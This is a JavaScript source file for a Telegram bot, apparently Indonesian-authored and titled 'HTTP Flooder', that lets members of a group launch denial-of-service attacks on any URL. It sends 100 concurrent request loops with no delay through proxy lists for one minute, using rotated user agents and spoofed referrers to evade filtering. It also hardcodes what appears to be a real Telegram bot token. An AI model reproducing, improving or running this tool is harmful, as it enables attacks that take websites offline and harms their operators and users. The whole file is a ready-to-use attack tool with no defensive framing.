const axios = require('axios');
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const TelegramBot = require('node-telegram-bot-api');

// === Konfigurasi ===
const REQUIRED_GROUP_ID = -1002696125734; // Ganti dengan ID grup kamu
const TELEGRAM_TOKEN = '7991511524:AAE1ReD73oQ7p8MRhLtj8UQZf8FxTA1OeG0'; // Ganti dengan token bot kamu
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const activeAttacks = new Map();
const proxyFile = 'proxy.txt';
const uaFile = 'ua.txt';

const userAgents = fs.readFileSync(uaFile, 'utf-8').replace(/\r/g, '').split('\n').map(line => line.trim());

const acceptHeader = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
];
const encodingHeader = ["gzip, deflate, br"];
const langHeader = ["en-US,en;q=0.9"];
const refers = ["https://www.google.com/", "https://www.bing.com/"];
const cplist = ["max-age=0", "no-cache"];

// === Utility ===
function readProxy() {
    try {
        const data = fs.readFileSync(proxyFile, 'utf8');
        return data.trim().split('\n').map(line => line.trim());
    } catch {
        return [];
    }
}

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function sanitizeUA(userAgent) {
    return userAgent.replace(/[^\x20-\x7E]/g, '');
}

// === Fungsi Utama Serangan ===
function sendReq(target, agent, userAgent, chatId, controller) {
    if (!controller.running) return;

    const sanitizedUserAgent = sanitizeUA(userAgent);
    const headers = {
        "User-Agent": sanitizedUserAgent,
        Accept: randElement(acceptHeader),
        "Accept-Encoding": randElement(encodingHeader),
        "Accept-Language": randElement(langHeader),
        Referer: randElement(refers),
        "Cache-Control": randElement(cplist),
        DNT: "1",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    };

    axios.get(target, {
        httpAgent: agent,
        httpsAgent: agent,
        headers: headers,
        timeout: 5000,
    }).catch(() => { });

    setTimeout(() => sendReq(target, agent, userAgent, chatId, controller), 0);
}

function startAttack(targetUrl, chatId) {
    const proxies = readProxy();
    const controller = { running: true };
    activeAttacks.set(targetUrl, controller);

    const numThreads = 100;
    for (let i = 0; i < numThreads; i++) {
        const proxy = randElement(proxies);
        const parts = proxy.split(":");
        const isSocks = parts[0].includes("socks");
        const protocol = isSocks ? "socks5" : "http";
        const proxyUrl = `${protocol}://${parts[0]}:${parts[1]}`;

        let agent;
        try {
            agent = isSocks ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
        } catch (e) {
            continue; // Skip proxy error
        }

        const userAgent = randElement(userAgents);
        sendReq(targetUrl, agent, userAgent, chatId, controller);
    }

    // Hentikan otomatis setelah waktu tertentu
    setTimeout(() => {
        controller.running = false;
        activeAttacks.delete(targetUrl);
        bot.sendMessage(chatId, `🛑 Serangan ke ${targetUrl} dihentikan otomatis.`);
    }, 60 * 1000); // 1 menit
}

// === Perintah Telegram ===
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Selamat datang! Gunakan /help untuk melihat perintah.");
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const text = `
📖 *DAFTAR PERINTAH BOT* 📖

🚀 */mulai <url>*  
Memulai serangan ke URL target.  
Contoh: \`/mulai https://example.com\`

🛑 */stop <url>*  
Menghentikan serangan ke URL yang sedang berjalan.  
Contoh: \`/stop https://example.com\`

🔒 Kamu harus join grup sebelum bisa menggunakan bot ini.
    `;
    bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

bot.onText(/\/stop\s+(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    let url = match[1].trim();
    if (!url.startsWith("http")) url = `https://${url}`;

    if (activeAttacks.has(url)) {
        activeAttacks.get(url).running = false;
        activeAttacks.delete(url);
        bot.sendMessage(chatId, `🛑 Serangan ke ${url} dihentikan.`);
    } else {
        bot.sendMessage(chatId, `⚠️ Tidak ada serangan aktif ke ${url}.`);
    }
});

bot.onText(/\/mulai\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    let url = match[1].trim();

    if (!url.startsWith("http")) url = `https://${url}`;

    try {
        new URL(url);
    } catch {
        return bot.sendMessage(chatId, "❌ URL tidak valid. Gunakan format /mulai https://example.com");
    }

    try {
        const member = await bot.getChatMember(REQUIRED_GROUP_ID, userId);
        if (["left", "kicked"].includes(member.status)) {
            return bot.sendMessage(chatId, "❌ Kamu harus bergabung ke grup terlebih dahulu.\nhttps://t.me/NamaGrupKamu");
        }
    } catch {
        return bot.sendMessage(chatId, "❌ Gagal memverifikasi keanggotaan grup.");
    }

    if (activeAttacks.has(url)) {
        return bot.sendMessage(chatId, "⚠️ Serangan ke URL ini sudah berjalan.");
    }

    bot.sendMessage(chatId, `🚀 Memulai serangan ke: ${url}`);
    startAttack(url, chatId);
});

// === Startup Banner ===
console.log('\033[38;5;46m' + `
╔═════════════════════════════╗
║       BLACKHEAD BOT         ║
║    HTTP FLOODER v2.2        ║
║   By: Rizky Blackhead       ║
╚═════════════════════════════╝
` + '\033[0m');
console.log("Bot Telegram sedang berjalan...");